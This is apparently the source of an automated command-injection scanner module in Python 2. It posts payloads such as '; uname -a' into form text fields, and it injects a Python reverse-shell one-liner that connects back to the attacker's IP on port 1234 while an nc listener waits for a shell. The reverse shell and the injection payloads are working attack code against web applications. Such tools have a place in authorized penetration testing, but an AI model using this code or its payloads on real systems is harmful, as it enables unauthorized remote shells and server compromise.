import requests
import socket
import os
import subprocess

class CommandInjection(object):
	def __init__(self, target):
		self.target = target
		self.url = target['url']
		self.path = target['path']
		self.partial_path = target['scheme'] + "://" + target['domain']
		self.query = target['query']
		self.results = {}
		self.exploit_param = {}
		self.vulnerable = False
		if 'method' in target:
			if target['method']:
				method = target['method'].upper()
			else:
				method = 'POST'
			self.method = method
		else:
			self.method = 'GET'
	
	def get_attacker_ip(self):
		# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
		return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]


	# https://www.owasp.org/index.php/Command_Injection
	def scan(self):
		payloads = {'; uname -a': 'GNU/Linux', '| uname -a': 'GNU/Linux'}
		# https://w00troot.blogspot.sg/2017/05/getting-reverse-shell-from-web-shell.html
		reverse_shell_string = "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( \"" + self.get_attacker_ip() + "\", 1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
		if self.method == 'POST':
			inputs = self.target['inputs']
			for input in inputs:
				# possible injection point
				if input['type'] == 'text':
					for payload, string in payloads.iteritems():
						params = { input['name']: payload }
						req = requests.post(self.url, data=params)
						if string in req.text:
							self.vulnerable = True
							print '[+] Code Injection Vulnerability: ' + self.path 
							self.exploit_param = params
							self.add_scan_results()
								
					params = { input['name']: reverse_shell_string }
					child = subprocess.Popen(["nc","-lvp","1234"],stdout=subprocess.PIPE,stdin=subprocess.PIPE)
					child.stdin.close()
					req = requests.post(self.url, data=params)
					if child.poll() is not None:
						response = child.stdout.read()
					else:
						child.kill()
						continue
					is_shell_obtained = response.find("$")
					if (is_shell_obtained != -1):
						self.vulnerable = True
						print '[+] Code Injection Vulnerability (Reverse Shell): ' + self.path 
						self.exploit_param = params
						self.add_scan_results()
							
		if self.vulnerable:
			return self.results 
		else:
			return None
			
	def add_scan_results(self):
		domain = self.partial_path
		if domain not in self.results:
			self.results[domain] = []

		result = {}
		result['endpoint'] = self.path
		result['params'] = self.exploit_param
		result['method'] = self.method
		self.results[domain].append(result)
		
	
	def generate_exploit(self, endpoint):
		pass
